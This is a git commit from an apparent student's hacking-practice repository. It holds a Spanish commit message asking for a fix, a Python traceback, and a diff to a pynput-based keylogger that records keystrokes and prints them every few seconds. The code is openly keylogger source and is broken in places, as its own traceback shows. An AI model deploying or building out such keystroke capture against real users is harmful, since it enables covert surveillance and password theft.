7456c004139e5e8b34d3cf1d1942f8ff5f917257
marpehc <murciamarcos39@gmail.com>
2025-03-22 12:46:51 +0100

    Need-fix keylogger.py
    Al darle a una tecla que no se de la a-z salta error concretamente:
    Unhandled exception in listener callback
    Traceback (most recent call last):
      File "c:\Users\user\Documents\GitHub\Clases\python\hacking-python\pynput.keyboard-APRENDER\keylogger.py", line 17, in tecla_presionada
        current_Key = str(key.char)
                          ^^^^^^^^
    AttributeError: 'Key' object has no attribute 'char'
    
    During handling of the above exception, another exception occurred:
    
    Traceback (most recent call last):
      File "C:\Users\user\AppData\Local\Programs\Python\Python311\Lib\site-packages\pynput\_util\__init__.py", line 230, in inner
        return f(self, *args, **kwargs)
               ^^^^^^^^^^^^^^^^^^^^^^^^
      File "C:\Users\user\AppData\Local\Programs\Python\Python311\Lib\site-packages\pynput\keyboard\_win32.py", line 329, in _process
        self.on_press(key, injected)
      File "C:\Users\user\AppData\Local\Programs\Python\Python311\Lib\site-packages\pynput\_util\__init__.py", line 146, in inner
        if f(*args) is False:
           ^^^^^^^^
      File "C:\Users\user\AppData\Local\Programs\Python\Python311\Lib\site-packages\pynput\_util\__init__.py", line 291, in <lambda>
        return lambda *a: f(*a[:actual])
                          ^^^^^^^^^^^^^^
      File "c:\Users\user\Documents\GitHub\Clases\python\hacking-python\pynput.keyboard-APRENDER\keylogger.py", line 22, in tecla_presionada
        current_Key =  + " " + str(key) + " "
                       ^^^^^
    TypeError: bad operand type for unary +: 'str'

--- python/hacking-python/pynput.keyboard-APRENDER/keylogger.py
+++ python/hacking-python/pynput.keyboard-APRENDER/keylogger.py
@@ -4,24 +4,31 @@ import threading
 log = ""
 
 class Keylogger:
+    def __init__(self):
+        self.log = ""
+        
+    def concatenar_al_log(self, string):
+        self.log = self.log + string
+        
 
     def tecla_presionada(self,key):
         global log
         try:
-            log = log + str(key.char)
-        except:
+            current_Key = str(key.char)
+        except AttributeError:
             if key == key.space:
-                log = log + " "
+                current_Key = log + " "
             else:
-                log = log + " " + str(key) + " "
+                current_Key =  + " " + str(key) + " "
+        self.concatenar_al_log(current_Key)
               # Muestra el texto entero 
 
 
 
     def reporte(self):
         global log 
-        print(log)
-        log = ""
+        print(self.log)
+        self.log = ""
         timer = threading.Timer(5, self.reporte) #Cada 10 segundos se ejecuta la función reporte. Con while loop daría problemas. 
         timer.start()
 
